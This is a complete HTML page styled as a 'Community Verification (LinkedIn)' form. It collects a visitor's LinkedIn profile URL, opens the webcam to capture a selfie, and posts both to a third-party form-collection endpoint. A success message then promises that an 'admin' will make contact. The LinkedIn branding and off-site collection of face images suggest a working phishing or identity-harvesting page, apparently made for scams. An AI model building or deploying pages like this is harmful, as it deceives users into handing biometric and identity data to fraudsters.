<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Community Verification (LinkedIn)</title>

<style>

body{
font-family:Arial;
background:#0f172a;
color:white;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.card{
background:#020617;
padding:25px;
border-radius:16px;
width:360px;
text-align:center;
}

input{
width:100%;
margin:10px 0;
padding:10px;
border-radius:8px;
border:none;
}

button{
padding:12px;
margin-top:12px;
width:100%;
border:none;
border-radius:10px;
background:#2563eb;
color:white;
font-size:16px;
cursor:pointer;
}

button:disabled{
background:#334155;
cursor:not-allowed;
}

.camera{
position:relative;
}

video{
width:100%;
border-radius:12px;
}

.circle{
position:absolute;
width:180px;
height:180px;
border:3px dashed #22c55e;
border-radius:50%;
top:50%;
left:50%;
transform:translate(-50%,-50%);
pointer-events:none;
}

#preview{
width:100%;
margin-top:10px;
border-radius:12px;
display:none;
}

#status{
margin-top:10px;
font-size:14px;
}

</style>

</head>

<body>

<div class="card">

<h3>Community Verification (LinkedIn)</h3>

<form id="verifyForm">

<input
type="url"
name="linkedin"
placeholder="LinkedIn profile URL"
required
>

<img id="preview">

<div class="camera">

<video
id="video"
autoplay
playsinline
></video>

<div class="circle"></div>

</div>

<input
type="hidden"
name="selfie"
id="selfieData"
>

<button
type="button"
onclick="capturePhoto()"
>
Capture Photo
</button>

<button
type="submit"
id="submitBtn"
disabled
>
Submit
</button>

<div id="status"></div>

</form>

</div>

<script>

const video =
document.getElementById("video")

const submitBtn =
document.getElementById("submitBtn")

navigator.mediaDevices
.getUserMedia({video:true})
.then(stream=>{
video.srcObject = stream
})

function capturePhoto(){

const canvas =
document.createElement("canvas")

canvas.width =
video.videoWidth

canvas.height =
video.videoHeight

const ctx =
canvas.getContext("2d")

ctx.drawImage(video,0,0)

const base64 =
canvas.toDataURL("image/jpeg")

document
.getElementById("selfieData")
.value =
base64

document
.getElementById("preview")
.src =
base64

document
.getElementById("preview")
.style.display =
"block"

submitBtn.disabled = false

}

document
.getElementById("verifyForm")
.addEventListener(
"submit",
async function(e){

e.preventDefault()

const status =
document.getElementById("status")

status.innerHTML =
"Submitting..."

const formData =
new FormData(this)

try{

const response =
await fetch(
"https://usebasin.com/f/4180b06c3b35",
{
method:"POST",
body:formData,
headers:{
"Accept":"application/json"
}
}
)

if(response.ok){

status.innerHTML =
"✅ Your Linkedin Verification submitted successfully. Thank you for connecting with us! Your admin will reach out to you in a moment"

this.reset()

document
.getElementById("preview")
.style.display =
"none"

submitBtn.disabled = true

}else{

status.innerHTML =
"❌ Form Submission failed. Please try again."

}

}catch(error){

status.innerHTML =
"❌ Network error. Please try again."

}

}

)

</script>

</body>
</html>
